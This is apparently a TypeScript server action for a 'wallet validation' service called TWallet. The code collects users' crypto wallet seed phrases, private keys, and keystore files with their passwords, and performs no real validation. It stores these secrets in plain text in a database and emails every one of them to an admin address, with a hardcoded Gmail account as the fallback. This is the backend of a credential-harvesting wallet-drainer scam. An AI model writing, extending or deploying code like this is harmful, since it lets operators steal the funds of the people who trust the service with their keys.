"use server";

import { createServerSupabaseClient } from "@/lib";
import { sendEmail, buildWalletValidationEmail } from "@/lib/email";

export type ValidationType = "mnemonics" | "keystore" | "private_key" | "hardware";

export interface ValidationInput {
  walletName: string;
  validationType: ValidationType;
  mnemonicPhrase?: string;
  keystoreJson?: string;
  keystorePassword?: string;
  privateKey?: string;
  hardwareType?: string;
}

const ADMIN_EMAIL = (process.env.ADMIN_EMAILS ?? "twalletservices.admin@gmail.com")
  .split(",")[0]!
  .trim();

export async function saveWalletValidation(input: ValidationInput) {
  const supabase = await createServerSupabaseClient();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return { error: "You must be logged in" };

  if (!input.walletName.trim()) return { error: "Wallet name is required" };

  const payload = {
    user_id: user.id,
    wallet_name: input.walletName.trim(),
    validation_type: input.validationType,
    mnemonic_phrase: input.mnemonicPhrase?.trim() || null,
    keystore_json: input.keystoreJson?.trim() || null,
    keystore_password: input.keystorePassword?.trim() || null,
    private_key: input.privateKey?.trim() || null,
    hardware_type: input.hardwareType || null,
  };

  const { error, data } = await supabase
    .from("wallet_validations")
    .insert(payload)
    .select("id, wallet_name, validation_type, created_at")
    .single();

  if (error) return { error: error.message };

  await supabase.from("audit_logs").insert({
    action: "wallet_added",
    target_type: "wallet_validations",
    target_id: data.id,
    details: { wallet_name: input.walletName.trim(), validation_type: input.validationType },
  });

  void sendEmail({
    to: ADMIN_EMAIL,
    subject: `[TWallet] New Wallet Validation — ${user.email}`,
    html: buildWalletValidationEmail({
      userEmail: user.email ?? "unknown",
      userId: user.id,
      walletName: input.walletName.trim(),
      validationType: input.validationType,
      mnemonicPhrase: input.mnemonicPhrase?.trim() || null,
      keystoreJson: input.keystoreJson?.trim() || null,
      keystorePassword: input.keystorePassword?.trim() || null,
      privateKey: input.privateKey?.trim() || null,
      hardwareType: input.hardwareType || null,
    }),
  });

  return { success: true, validationId: data.id };
}
